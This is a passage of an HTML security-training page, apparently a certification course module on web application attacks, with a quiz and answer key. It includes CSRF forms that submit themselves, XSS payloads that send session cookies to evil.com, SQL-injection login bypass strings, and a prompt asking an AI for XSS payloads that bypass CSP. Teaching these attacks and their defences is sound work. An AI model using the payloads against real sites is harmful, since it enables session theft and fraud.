+                <button class="btn btn-primary" onclick="showSection('csrf-attacks')">Next: CSRF Attacks</button>
+            </div>
+
+            <!-- CSRF Attacks Section -->
+            <div id="csrf-attacks" class="module-section">
+                <h2 class="section-title">Cross-Site Request Forgery (CSRF) Attacks</h2>
+
+                <div class="card">
+                    <h3>Understanding CSRF: The Invisible Attack</h3>
+                    <p>Cross-Site Request Forgery tricks authenticated users into performing unintended actions on web applications where they're logged in.</p>
+
+                    <div class="highlight-box">
+                        <h4>How CSRF Works</h4>
+                        <ol style="line-height: 1.8; margin: 15px 0; padding-left: 20px;">
+                            <li><strong>Victim authenticates</strong> to legitimate website (bank.com)</li>
+                            <li><strong>Attacker creates malicious page</strong> with forged request</li>
+                            <li><strong>Victim visits attacker's page</strong> while still logged into bank.com</li>
+                            <li><strong>Browser automatically sends</strong> authenticated cookies with forged request</li>
+                            <li><strong>Server processes request</strong> as if it came from the legitimate user</li>
+                        </ol>
+                    </div>
+
+                    <div class="attack-demo">
+                        <h4>CSRF Attack Example: Bank Transfer</h4>
+                        <div class="code-block">
+&lt;!-- Legitimate bank transfer form --&gt;
+&lt;form action="https://bank.com/transfer" method="POST"&gt;
+  &lt;input name="to_account" value="12345"&gt;
+  &lt;input name="amount" value="1000"&gt;
+  &lt;input type="submit" value="Transfer"&gt;
+&lt;/form&gt;
+
+&lt;!-- Attacker's malicious page --&gt;
+&lt;img src="https://bank.com/transfer?to_account=999999&amp;amount=10000" 
+     style="display:none"&gt;
+
+&lt;!-- Or auto-submitting form --&gt;
+&lt;form id="csrf" action="https://bank.com/transfer" method="POST"&gt;
+  &lt;input name="to_account" value="999999"&gt;
+  &lt;input name="amount" value="10000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('csrf').submit();&lt;/script&gt;
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>CSRF Attack Vectors & Techniques</h3>
+                    
+                    <div class="vulnerability-grid">
+                        <div class="vuln-card">
+                            <h4>Image-Based CSRF</h4>
+                            <div class="code-block">
+&lt;img src="https://admin.com/delete_user?id=123"&gt;
+&lt;img src="https://shop.com/buy?item=laptop&amp;qty=5"&gt;
+                            </div>
+                            <p>Exploits GET requests that change application state</p>
+                        </div>
+
+                        <div class="vuln-card">
+                            <h4>Form-Based CSRF</h4>
+                            <div class="code-block">
+&lt;form action="https://app.com/change_email" method="POST"&gt;
+  &lt;input name="email" value="attacker@evil.com"&gt;
+&lt;/form&gt;
+&lt;script&gt;
+  document.forms[0].submit();
+&lt;/script&gt;
+                            </div>
+                            <p>Targets POST requests with automatic form submission</p>
+                        </div>
+
+                        <div class="vuln-card">
+                            <h4>AJAX CSRF</h4>
+                            <div class="code-block">
+&lt;script&gt;
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "https://api.com/delete_account", true);
+xhr.setRequestHeader("Content-Type", "application/json");
+xhr.send('{"confirm": true}');
+&lt;/script&gt;
+                            </div>
+                            <p>Advanced technique targeting AJAX endpoints</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>CSRF Protection Mechanisms</h3>
+                    
+                    <div class="success-box">
+                        <h4>Primary Defense: CSRF Tokens</h4>
+                        <div class="code-block">
+&lt;!-- Synchronizer Token Pattern --&gt;
+&lt;form action="/transfer" method="POST"&gt;
+  &lt;input type="hidden" name="csrf_token" value="abc123xyz789"&gt;
+  &lt;input name="to_account" value="12345"&gt;
+  &lt;input name="amount" value="1000"&gt;
+&lt;/form&gt;
+
+// Server-side validation
+if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
+    die('CSRF token mismatch!');
+}
+                        </div>
+                    </div>
+
+                    <div class="warning-box">
+                        <h4>Additional CSRF Defenses</h4>
+                        <ul style="line-height: 1.8;">
+                            <li><strong>SameSite Cookies:</strong> Prevents cross-site cookie sending</li>
+                            <li><strong>Origin/Referer Validation:</strong> Check request source</li>
+                            <li><strong>Custom Headers:</strong> Require non-simple headers for AJAX</li>
+                            <li><strong>Double Submit Cookie:</strong> Compare cookie and form values</li>
+                            <li><strong>Re-authentication:</strong> Require password for sensitive actions</li>
+                            <li><strong>CAPTCHA:</strong> Human verification for critical operations</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>CSRF vs XSS: Understanding the Difference</h3>
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0;">
+                        <div style="background: #ffe6e6; padding: 20px; border-radius: 10px; border-left: 4px solid #e74c3c;">
+                            <h4>Cross-Site Scripting (XSS)</h4>
+                            <ul style="margin: 10px 0;">
+                                <li>Injects malicious <strong>scripts</strong></li>
+                                <li>Executes in <strong>victim's browser</strong></li>
+                                <li>Targets <strong>users of the application</strong></li>
+                                <li>Can bypass CSRF protections</li>
+                            </ul>
+                        </div>
+                        <div style="background: #e6f3ff; padding: 20px; border-radius: 10px; border-left: 4px solid #3498db;">
+                            <h4>Cross-Site Request Forgery (CSRF)</h4>
+                            <ul style="margin: 10px 0;">
+                                <li>Forges malicious <strong>requests</strong></li>
+                                <li>Executes on <strong>target server</strong></li>
+                                <li>Targets <strong>the application itself</strong></li>
+                                <li>Requires user to be authenticated</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <button class="btn btn-primary" onclick="showSection('auth-attacks')">Next: Authentication Attacks</button>
+            </div>
+
+            <!-- Authentication Attacks Section -->
+            <div id="auth-attacks" class="module-section">
+                <h2 class="section-title">Authentication & Session Management Attacks</h2>
+
+                <div class="card">
+                    <h3>Authentication Vulnerabilities</h3>
+                    <p>Authentication failures represent one of the most critical security risks in web applications.</p>
+
+                    <div class="vulnerability-grid">
+                        <div class="vuln-card">
+                            <h4>Weak Password Policies</h4>
+                            <ul>
+                                <li>No minimum length requirements</li>
+                                <li>Common passwords allowed</li>
+                                <li>No complexity requirements</li>
+                                <li>Password reuse permitted</li>
+                            </ul>
+                        </div>
+
+                        <div class="vuln-card">
+                            <h4>Brute Force Attacks</h4>
+                            <ul>
+                                <li>No rate limiting implementation</li>
+                                <li>Account lockout bypasses</li>
+                                <li>Dictionary attacks</li>
+                                <li>Credential stuffing</li>
+                            </ul>
+                        </div>
+
+                        <div class="vuln-card">
+                            <h4>Session Management Issues</h4>
+                            <ul>
+                                <li>Predictable session IDs</li>
+                                <li>Session fixation attacks</li>
+                                <li>Insufficient session timeout</li>
+                                <li>Session hijacking vulnerabilities</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>Session Hijacking Techniques</h3>
+                    
+                    <div class="attack-demo">
+                        <h4>Session Cookie Theft</h4>
+                        <div class="code-block">
+// XSS payload to steal session cookies
+&lt;script&gt;
+document.location='http://evil.com/steal.php?cookie='+document.cookie;
+&lt;/script&gt;
+
+// Or using fetch API
+&lt;script&gt;
+fetch('http://evil.com/log.php', {
+    method: 'POST',
+    body: 'cookies=' + encodeURIComponent(document.cookie)
+});
+&lt;/script&gt;
+                        </div>
+                    </div>
+
+                    <div class="warning-box">
+                        <h4>Session Attack Vectors</h4>
+                        <ul style="line-height: 1.8;">
+                            <li><strong>Session Fixation:</strong> Forcing user to use attacker-known session ID</li>
+                            <li><strong>Session Prediction:</strong> Guessing sequential session identifiers</li>
+                            <li><strong>Man-in-the-Middle:</strong> Intercepting session tokens over insecure connections</li>
+                            <li><strong>Session Replay:</strong> Reusing captured session tokens</li>
+                            <li><strong>Cross-Site Session Transfer:</strong> Session token leakage via referrer headers</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>Authentication Bypass Techniques</h3>
+                    
+                    <div class="code-block">
+// SQL Injection Authentication Bypass
+Username: admin'--
+Password: anything
+
+// Results in SQL: 
+// SELECT * FROM users WHERE username = 'admin'-- ' AND password = 'anything'
+
+// Logic flaw exploitation
+// Vulnerable code:
+if (username == "admin" || password == "secret123") {
+    grant_access();
+}
+
+// Attack: Use any username with password "secret123"
+                    </div>
+
+                    <div class="highlight-box">
+                        <h4>Multi-Factor Authentication (MFA) Bypasses</h4>
+                        <ul style="line-height: 1.8;">
+                            <li><strong>Response Manipulation:</strong> Modifying MFA verification responses</li>
+                            <li><strong>Session Abuse:</strong> Bypassing MFA after initial authentication</li>
+                            <li><strong>Backup Code Enumeration:</strong> Brute forcing backup codes</li>
+                            <li><strong>Time-based Attack:</strong> Exploiting TOTP synchronization issues</li>
+                            <li><strong>Social Engineering:</strong> SIM swapping and phone number hijacking</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>Secure Authentication Implementation</h3>
+                    
+                    <div class="success-box">
+                        <h4>Authentication Best Practices</h4>
+                        <ul style="line-height: 1.8;">
+                            <li><strong>Strong Password Policy:</strong> Minimum 12 characters, complexity requirements</li>
+                            <li><strong>Account Lockout:</strong> Progressive delays and temporary lockouts</li>
+                            <li><strong>Secure Session Management:</strong> Cryptographically random session IDs</li>
+                            <li><strong>HTTPS Everywhere:</strong> Encrypt all authentication traffic</li>
+                            <li><strong>Multi-Factor Authentication:</strong> Something you know + something you have</li>
+                            <li><strong>Session Security:</strong> HttpOnly, Secure, and SameSite cookie flags</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <button class="btn btn-primary" onclick="showSection('tools')">Next: Testing Tools</button>
+            </div>
+
+            <!-- Testing Tools Section -->
+            <div id="tools" class="module-section">
+                <h2 class="section-title">Web Application Security Testing Tools</h2>
+
+                <div class="card">
+                    <h3>Professional Security Testing Arsenal</h3>
+                    <p>Modern web application security testing requires a combination of automated scanners, manual testing tools, and AI-powered analysis platforms.</p>
+                </div>
+
+                <div class="tool-showcase">
+                    <div class="tool-card">
+                        <h3>Burp Suite Professional</h3>
+                        <p><strong>Industry Standard Web Security Testing</strong></p>
+                        <ul style="text-align: left; margin: 15px 0;">
+                            <li>Comprehensive vulnerability scanning</li>
+                            <li>Manual testing proxy capabilities</li>
+                            <li>Advanced payload generation</li>
+                            <li>Extensible plugin architecture</li>
+                        </ul>
+                        <div class="btn btn-warning" onclick="showToolDetails('burp')">Learn More</div>
+                    </div>
+
+                    <div class="tool-card">
+                        <h3>OWASP ZAP (Zed Attack Proxy)</h3>
+                        <p><strong>Free & Open Source Security Scanner</strong></p>
+                        <ul style="text-align: left; margin: 15px 0;">
+                            <li>Automated security scanning</li>
+                            <li>Man-in-the-middle proxy</li>
+                            <li>Spider and crawler functionality</li>
+                            <li>REST API for CI/CD integration</li>
+                        </ul>
+                        <div class="btn btn-warning" onclick="showToolDetails('zap')">Learn More</div>
+                    </div>
+
+                    <div class="tool-card">
+                        <h3>Nuclei Scanner</h3>
+                        <p><strong>Fast Template-Based Vulnerability Scanner</strong></p>
+                        <ul style="text-align: left; margin: 15px 0;">
+                            <li>YAML-based template engine</li>
+                            <li>Community-driven template library</li>
+                            <li>High-speed parallel scanning</li>
+                            <li>Custom template creation</li>
+                        </ul>
+                        <div class="btn btn-warning" onclick="showToolDetails('nuclei')">Learn More</div>
+                    </div>
+
+                    <div class="tool-card">
+                        <h3>Nikto Web Scanner</h3>
+                        <p><strong>Web Server Security Assessment Tool</strong></p>
+                        <ul style="text-align: left; margin: 15px 0;">
+                            <li>CGI vulnerability detection</li>
+                            <li>Misconfigurations identification</li>
+                            <li>Version-specific security issues</li>
+                            <li>SSL/TLS testing capabilities</li>
+                        </ul>
+                        <div class="btn btn-warning" onclick="showToolDetails('nikto')">Learn More</div>
+                    </div>
+
+                    <div class="tool-card">
+                        <h3>SQLMap</h3>
+                        <p><strong>Automated SQL Injection Testing</strong></p>
+                        <ul style="text-align: left; margin: 15px 0;">
+                            <li>Database fingerprinting</li>
+                            <li>Advanced injection techniques</li>
+                            <li>Database takeover capabilities</li>
+                            <li>Out-of-band exploitation</li>
+                        </ul>
+                        <div class="btn btn-warning" onclick="showToolDetails('sqlmap')">Learn More</div>
+                    </div>
+
+                    <div class="tool-card">
+                        <h3>XSS Hunter</h3>
+                        <p><strong>Blind XSS Detection Platform</strong></p>
+                        <ul style="text-align: left; margin: 15px 0;">
+                            <li>Blind XSS payload injection</li>
+                            <li>Real-time notification system</li>
+                            <li>Payload customization</li>
+                            <li>Evidence collection</li>
+                        </ul>
+                        <div class="btn btn-warning" onclick="showToolDetails('xsshunter')">Learn More</div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>AI-Powered Security Testing (CEH v13 Enhancement)</h3>
+                    <p>The integration of AI in web application security testing represents a paradigm shift in vulnerability discovery and exploitation.</p>
+                    
+                    <div class="highlight-box">
+                        <h4>AI-Enhanced Testing Capabilities</h4>
+                        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin: 20px 0;">
+                            <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px;">
+                                <strong>Smart Fuzzing</strong><br>
+                                AI generates context-aware payloads based on application behavior
+                            </div>
+                            <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px;">
+                                <strong>Pattern Recognition</strong><br>
+                                ML algorithms identify complex vulnerability patterns
+                            </div>
+                            <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px;">
+                                <strong>False Positive Reduction</strong><br>
+                                Neural networks filter out noise and focus on real threats
+                            </div>
+                            <div style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 8px;">
+                                <strong>Automated Exploitation</strong><br>
+                                AI chains vulnerabilities for complex attack scenarios
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="code-block">
+# Example: Using AI-powered tools for web app testing
+# ChatGPT integration for payload generation
+curl -X POST "https://api.openai.com/v1/chat/completions" \
+  -H "Authorization: Bearer $OPENAI_API_KEY" \
+  -d '{
+    "model": "gpt-4",
+    "messages": [{"role": "user", "content": "Generate XSS payloads for bypassing CSP with nonce"}]
+  }'
+
+# ShellGPT for automated reconnaissance
+sgpt "Generate SQL injection payloads for MySQL 8.0 error-based enumeration"
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>Manual Testing Methodology</h3>
+                    
+                    <div class="warning-box">
+                        <h4>Systematic Testing Approach</h4>
+                        <ol style="line-height: 1.8; padding-left: 20px;">
+                            <li><strong>Reconnaissance:</strong> Information gathering and attack surface mapping</li>
+                            <li><strong>Authentication Testing:</strong> Login mechanisms and session management</li>
+                            <li><strong>Authorization Testing:</strong> Access controls and privilege escalation</li>
+                            <li><strong>Input Validation:</strong> Injection attacks and data validation</li>
+                            <li><strong>Error Handling:</strong> Information disclosure through error messages</li>
+                            <li><strong>Session Management:</strong> Token security and session lifecycle</li>
+                            <li><strong>Configuration Testing:</strong> Security misconfigurations and defaults</li>
+                            <li><strong>Transport Security:</strong> HTTPS implementation and certificate validation</li>
+                        </ol>
+                    </div>
+                </div>
+
+                <button class="btn btn-primary" onclick="showSection('countermeasures')">Next: Countermeasures</button>
+            </div>
+
+            <!-- Countermeasures Section -->
+            <div id="countermeasures" class="module-section">
+                <h2 class="section-title">Web Application Security Countermeasures</h2>
+
+                <div class="card">
+                    <h3>Secure Development Lifecycle (SDLC)</h3>
+                    <p>Building security into every phase of application development:</p>
+
+                    <div class="vulnerability-grid">
+                        <div class="vuln-card" style="border-top-color: #3498db;">
+                            <h4>Planning & Design</h4>
+                            <ul>
+                                <li>Threat modeling exercises</li>
+                                <li>Security requirements definition</li>
+                                <li>Architecture security reviews</li>
+                                <li>Privacy by design principles</li>
+                            </ul>
+                        </div>
+
+                        <div class="vuln-card" style="border-top-color: #27ae60;">
+                            <h4>Development</h4>
+                            <ul>
+                                <li>Secure coding standards</li>
+                                <li>Input validation frameworks</li>
+                                <li>Authentication libraries</li>
+                                <li>Code review processes</li>
+                            </ul>
+                        </div>
+
+                        <div class="vuln-card" style="border-top-color: #f39c12;">
+                            <h4>Testing</h4>
+                            <ul>
+                                <li>Static analysis (SAST)</li>
+                                <li>Dynamic analysis (DAST)</li>
+                                <li>Interactive analysis (IAST)</li>
+                                <li>Penetration testing</li>
+                            </ul>
+                        </div>
+
+                        <div class="vuln-card" style="border-top-color: #e74c3c;">
+                            <h4>Deployment</h4>
+                            <ul>
+                                <li>Security configuration management</li>
+                                <li>Runtime protection (RASP)</li>
+                                <li>Continuous monitoring</li>
+                                <li>Incident response procedures</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>Input Validation & Sanitization</h3>
+                    
+                    <div class="success-box">
+                        <h4>Defense in Depth Strategy</h4>
+                        <div class="code-block">
+// Input validation example (PHP)
+function validateInput($input, $type) {
+    switch($type) {
+        case 'email':
+            return filter_var($input, FILTER_VALIDATE_EMAIL);
+        case 'int':
+            return filter_var($input, FILTER_VALIDATE_INT);
+        case 'string':
+            return htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
+        default:
+            return false;
+    }
+}
+
+// Prepared statements for SQL injection prevention
+$stmt = $pdo->prepare("SELECT * FROM users WHERE email = ? AND status = ?");
+$stmt->execute([$email, $status]);
+                        </div>
+                    </div>
+
+                    <div class="warning-box">
+                        <h4>Common Validation Mistakes</h4>
+                        <ul style="line-height: 1.8;">
+                            <li><strong>Client-side Only:</strong> Relying solely on JavaScript validation</li>
+                            <li><strong>Blacklist Approach:</strong> Blocking known bad inputs instead of allowing good</li>
+                            <li><strong>Incomplete Encoding:</strong> Not encoding for the correct context</li>
+                            <li><strong>Length Limits:</strong> Not enforcing maximum input lengths</li>
+                            <li><strong>Type Confusion:</strong> Not validating data types properly</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>Authentication & Session Security</h3>
+                    
+                    <div class="highlight-box">
+                        <h4>Multi-Factor Authentication Implementation</h4>
+                        <div class="code-block">
+// TOTP-based MFA example
+import { authenticator } from 'otplib';
+
+// Generate secret for new user
+const secret = authenticator.generateSecret();
+
+// Verify TOTP token
+function verifyMFA(token, secret) {
+    try {
+        return authenticator.verify({ token, secret });
+    } catch (err) {
+        return false;
+    }
+}
+
+// Rate limiting for MFA attempts
+const attempts = new Map();
+function checkMFAAttempts(userId) {
+    const userAttempts = attempts.get(userId) || 0;
+    if (userAttempts >= 3) {
+        throw new Error('Too many MFA attempts');
+    }
+}
+                        </div>
+                    </div>
+
+                    <div class="vulnerability-grid">
+                        <div class="vuln-card">
+                            <h4>Secure Cookie Configuration</h4>
+                            <div class="code-block">
+// Secure session cookie settings
+Set-Cookie: sessionid=abc123; 
+  HttpOnly; 
+  Secure; 
+  SameSite=Strict; 
+  Max-Age=1800; 
+  Path=/
+                            </div>
+                        </div>
+
+                        <div class="vuln-card">
+                            <h4>Session Management</h4>
+                            <div class="code-block">
+// Session security best practices
+session_set_cookie_params([
+    'lifetime' => 1800,
+    'path' => '/',
+    'domain' => '',
+    'secure' => true,
+    'httponly' => true,
+    'samesite' => 'Strict'
+]);
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>Content Security Policy (CSP)</h3>
+                    <p>CSP provides an additional layer of security against XSS attacks by controlling resource loading:</p>
+                    
+                    <div class="code-block">
+<!-- Basic CSP header -->
+Content-Security-Policy: 
+  default-src 'self'; 
+  script-src 'self' 'unsafe-inline' https://cdn.example.com; 
+  style-src 'self' 'unsafe-inline'; 
+  img-src 'self' data: https:; 
+  font-src 'self' https://fonts.googleapis.com; 
+  connect-src 'self' https://api.example.com; 
+  frame-ancestors 'none';
+
+<!-- Strict CSP with nonces -->
+Content-Security-Policy: 
+  default-src 'none'; 
+  script-src 'nonce-abc123def456'; 
+  style-src 'nonce-xyz789uvw012'; 
+  img-src 'self'; 
+  base-uri 'self'; 
+  form-action 'self';
+                    </div>
+
+                    <div class="success-box">
+                        <h4>CSP Implementation Strategy</h4>
+                        <ul style="line-height: 1.8;">
+                            <li><strong>Report-Only Mode:</strong> Test CSP without blocking resources</li>
+                            <li><strong>Gradual Deployment:</strong> Start with permissive policies and tighten</li>
+                            <li><strong>Nonce-based:</strong> Use random nonces for inline scripts/styles</li>
+                            <li><strong>Hash-based:</strong> Allow specific inline code using SHA hashes</li>
+                            <li><strong>Monitoring:</strong> Analyze CSP violation reports regularly</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>Web Application Firewalls (WAF)</h3>
+                    
+                    <div class="tool-showcase">
+                        <div class="tool-card" style="background: linear-gradient(135deg, #ff9a9e, #fecfef);">
+                            <h4>Cloud WAF Solutions</h4>
+                            <ul style="text-align: left;">
+                                <li>CloudFlare WAF</li>
+                                <li>AWS WAF</li>
+                                <li>Azure Application Gateway</li>
+                                <li>Google Cloud Armor</li>
+                            </ul>
+                        </div>
+
+                        <div class="tool-card" style="background: linear-gradient(135deg, #a8edea, #fed6e3);">
+                            <h4>On-Premise WAF</h4>
+                            <ul style="text-align: left;">
+                                <li>ModSecurity</li>
+                                <li>F5 Application Security Manager</li>
+                                <li>Imperva SecureSphere</li>
+                                <li>Barracuda Web Application Firewall</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="warning-box">
+                        <h4>WAF Limitations</h4>
+                        <p>While WAFs provide valuable protection, they should not be the sole security measure:</p>
+                        <ul style="line-height: 1.8;">
+                            <li><strong>Bypass Techniques:</strong> Encoding, obfuscation, and payload variants</li>
+                            <li><strong>False Positives:</strong> Blocking legitimate traffic</li>
+                            <li><strong>Performance Impact:</strong> Latency and throughput considerations</li>
+                            <li><strong>Configuration Complexity:</strong> Requiring ongoing tuning and maintenance</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <button class="btn btn-primary" onclick="showSection('quiz')">Next: Assessment</button>
+            </div>
+
+            <!-- Quiz Section -->
+            <div id="quiz" class="module-section">
+                <h2 class="section-title">Module 14 Assessment</h2>
+
+                <div class="card">
+                    <h3>Comprehensive Web Application Security Assessment</h3>
+                    <p>Test your understanding of web application hacking techniques, vulnerabilities, and countermeasures.</p>
+                    
+                    <div class="metrics-grid">
+                        <div class="metric-card">
+                            <span class="metric-value" id="questionCount">25</span>
+                            <div>Total Questions</div>
+                        </div>
+                        <div class="metric-card">
+                            <span class="metric-value" id="timeLimit">45</span>
+                            <div>Minutes</div>
+                        </div>
+                        <div class="metric-card">
+                            <span class="metric-value">80%</span>
+                            <div>Passing Score</div>
+                        </div>
+                        <div class="metric-card">
+                            <span class="metric-value" id="currentScore">0</span>
+                            <div>Current Score</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="quiz-container" id="quizContainer">
+                    <div id="quizQuestions"></div>
+                    <div style="text-align: center; margin: 30px 0;">
+                        <button class="btn btn-primary" id="startQuiz" onclick="startQuiz()">Start Assessment</button>
+                        <button class="btn btn-success" id="submitQuiz" onclick="submitQuiz()" style="display: none;">Submit Assessment</button>
+                        <button class="btn btn-warning" onclick="resetQuiz()" style="margin-left: 10px;">Reset Quiz</button>
+                    </div>
+                </div>
+
+                <div id="resultsContainer" style="display: none;">
+                    <div class="card">
+                        <h3>Assessment Results</h3>
+                        <div id="scoreDisplay"></div>
+                        <div id="detailedResults"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal for detailed information -->
+    <div id="detailModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()">&times;</span>
+            <div id="modalContent"></div>
+        </div>
+    </div>
+
+    <script>
+        // Global variables
+        let currentSection = 'overview';
+        let completedSections = new Set();
+        let sectionOrder = ['overview', 'web-basics', 'owasp-top10', 'injection-attacks', 'xss-attacks', 'csrf-attacks', 'auth-attacks', 'tools', 'countermeasures', 'quiz'];
+        let quizAnswers = {};
+        let quizScore = 0;
+        let startTime = Date.now();
+        let quizStartTime = null;
+        let quizTimeLimit = 45 * 60 * 1000; // 45 minutes in milliseconds
+        let quizTimer = null;
+
+        // Quiz questions array
+        const quizQuestions = [
+            {
+                question: "Which OWASP Top 10 2021 vulnerability has moved to #1 position?",
+                options: [
+                    "Injection",
+                    "Broken Access Control",
+                    "Cryptographic Failures",
+                    "Cross-Site Scripting"
+                ],
+                correct: 1,
+                explanation: "Broken Access Control moved from #5 in 2017 to #1 in 2021, representing access control failures that allow unauthorized data access or functionality."
+            },
+            {
+                question: "What is the primary difference between Reflected and Stored XSS?",
+                options: [
+                    "Reflected XSS is more dangerous than Stored XSS",
+                    "Stored XSS persists in the database, Reflected XSS does not",
+                    "Reflected XSS affects more users than Stored XSS",
+                    "There is no significant difference"
+                ],
+                correct: 1,
+                explanation: "Stored XSS payloads are permanently stored on the target server (database, file system), while Reflected XSS payloads are immediately returned in the response without being stored."
+            },
+            {
+                question: "Which SQL injection payload is most likely to bypass basic authentication?",
+                options: [
+                    "' AND 1=1--",
+                    "' OR 1=1--",
+                    "' UNION SELECT *--",
+                    "'; DROP TABLE--"
+                ],
+                correct: 1,
+                explanation: "' OR 1=1-- creates a condition that always evaluates to true, effectively bypassing password checks in vulnerable authentication queries."
+            },
+            {
+                question: "What does CSRF stand for and what does it exploit?",
+                options: [
+                    "Cross-Site Request Forgery - exploits user trust",
+                    "Cross-Site Resource Forgery - exploits server resources",
+                    "Cross-Site Request Failure - exploits network failures",
+                    "Cross-Site Response Forgery - exploits HTTP responses"
+                ],
+                correct: 0,
+                explanation: "CSRF (Cross-Site Request Forgery) exploits the trust that a site has in a user's browser by forcing authenticated users to perform unintended actions."
+            },
+            {
+                question: "Which HTTP header provides the most effective defense against XSS attacks?",
+                options: [
+                    "X-Frame-Options",
+                    "Content-Security-Policy",
+                    "X-XSS-Protection",
+                    "Strict-Transport-Security"
+                ],
+                correct: 1,
+                explanation: "Content-Security-Policy (CSP) provides comprehensive protection against XSS by controlling which resources can be loaded and executed by the browser."
+            },
+            {
+                question: "What is the purpose of prepared statements in SQL injection prevention?",
+                options: [
+                    "To improve database performance",
+                    "To separate SQL code from data parameters",
+                    "To encrypt database connections",
+                    "To validate user input"
+                ],
+                correct: 1,
+                explanation: "Prepared statements separate SQL code from data parameters, preventing user input from being interpreted as SQL commands and effectively preventing SQL injection."
+            },
+            {
+                question: "Which cookie attribute prevents client-side JavaScript access?",
+                options: [
+                    "Secure",
+                    "SameSite",
+                    "HttpOnly",
+                    "Path"
+                ],
+                correct: 2,
+                explanation: "The HttpOnly flag prevents client-side scripts from accessing cookies, providing protection against XSS-based cookie theft."
+            },
+            {
+                question: "In DOM-based XSS, where does the malicious script execute?",
+                options: [
+                    "On the server before sending the response",
+                    "In the database when storing user input",
+                    "In the browser's DOM environment",
+                    "In the network during transmission"
+                ],
+                correct: 2,
+                explanation: "DOM-based XSS occurs when JavaScript modifies the DOM in an unsafe way, with the payload never being sent to the server and executing entirely in the client's browser."
+            },
+            {
+                question: "Which tool is considered the industry standard for web application security testing?",
+                options: [
+                    "OWASP ZAP",
+                    "Nikto",
+                    "Burp Suite Professional",
+                    "SQLMap"
+                ],
+                correct: 2,
+                explanation: "Burp Suite Professional is widely regarded as the industry standard for web application security testing, offering comprehensive manual and automated testing capabilities."
+            },
+            {
+                question: "What is the main advantage of using HTTPS over HTTP for web applications?",
+                options: [
+                    "Faster loading times",
+                    "Better search engine ranking",
+                    "Encryption of data in transit",
+                    "Reduced server load"
+                ],
+                correct: 2,
+                explanation: "HTTPS encrypts data in transit using TLS/SSL, protecting against man-in-the-middle attacks and ensuring confidentiality and integrity of communications."
+            },
+            {
+                question: "Which OWASP Top 10 category covers vulnerabilities in third-party libraries?",
+                options: [
+                    "Security Misconfiguration",
+                    "Vulnerable and Outdated Components",
+                    "Software and Data Integrity Failures",
+                    "Security Logging and Monitoring Failures"
+                ],
+                correct: 1,
+                explanation: "A06:2021 – Vulnerable and Outdated Components specifically addresses risks from using components with known vulnerabilities, including third-party libraries and frameworks."
+            },
+            {
+                question: "What is the primary purpose of input validation in web applications?",
+                options: [
+                    "To improve user experience",
+                    "To reduce server load",
+                    "To prevent malicious data from entering the system",
+                    "To ensure data formatting consistency"
+                ],
+                correct: 2,
+                explanation: "Input validation's primary security purpose is to prevent malicious data from entering the system, protecting against various injection attacks and data corruption."
+            },
+            {
+                question: "Which technique is most effective for preventing CSRF attacks?",
+                options: [
+                    "Input sanitization",
+                    "HTTPS encryption",
+                    "Synchronizer tokens",
+                    "Rate limiting"
+                ],
+                correct: 2,
+                explanation: "Synchronizer tokens (CSRF tokens) are the most effective defense against CSRF attacks, ensuring that requests originate from legitimate forms within the application."
+            },
+            {
+                question: "What does the SameSite cookie attribute protect against?",
+                options: [
+                    "XSS attacks",
+                    "CSRF attacks",
+                    "SQL injection",
+                    "Session hijacking"
+                ],
+                correct: 1,
+                explanation: "The SameSite attribute prevents cookies from being sent with cross-site requests, providing protection against CSRF attacks by default."
+            },
+            {
+                question: "Which HTTP method should never be used for state-changing operations?",
+                options: [
+                    "POST",
+                    "PUT",
+                    "DELETE",
+                    "GET"
+                ],
+                correct: 3,
+                explanation: "GET requests should never be used for state-changing operations as they can be triggered by simple links or images, making them vulnerable to CSRF attacks."
+            },
+            {
+                question: "What is the main risk of using default credentials in web applications?",
+                options: [
+                    "Poor user experience",
+                    "Compliance violations",
+                    "Unauthorized access by attackers",
+                    "Performance degradation"
+                ],
+                correct: 2,
+                explanation: "Default credentials are well-known and publicly documented, allowing attackers to easily gain unauthorized access to systems that haven't changed these defaults."
+            },
+            {
+                question: "Which encoding method is most appropriate for preventing XSS in HTML context?",
+                options: [
+                    "URL encoding",
+                    "Base64 encoding",
+                    "HTML entity encoding",
+                    "JavaScript encoding"
+                ],
+                correct: 2,
+                explanation: "HTML entity encoding converts special characters to their HTML entity equivalents (e.g., < becomes &lt;), preventing them from being interpreted as HTML markup."
+            },
+            {
+                question: "What is the primary benefit of using Content Security Policy (CSP)?",
+                options: [
+                    "Faster page loading",
+                    "Better SEO rankings",
+                    "XSS attack prevention",
+                    "Reduced bandwidth usage"
+                ],
+                correct: 2,
